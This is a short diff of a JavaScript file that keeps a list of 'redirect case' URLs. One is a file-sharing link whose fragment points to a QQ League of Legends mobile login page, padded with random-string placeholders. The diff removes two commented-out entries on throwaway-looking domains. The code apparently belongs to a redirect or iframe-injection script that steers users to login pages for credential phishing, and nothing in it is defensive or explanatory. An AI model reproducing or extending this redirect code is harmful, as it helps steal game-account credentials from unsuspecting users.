@@ -3,8 +3,6 @@ addiframe =null;
 //跳转案例
 var urls=[
 	'https://znsw.lanzouj.com/b02lb0lvc?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html?{nnnnnnnn}{www}',
-//	'https://gnmsgl.singmwn53g.com/bbd_2.html&{nnnnnnnn}{www}',
-//	'https://bbdgalme.xn--95qo289e20l.com/bbd_2.html&{nnnnnnnn}{www}',
 ];
 
 if(/alert/.test(location.href)){
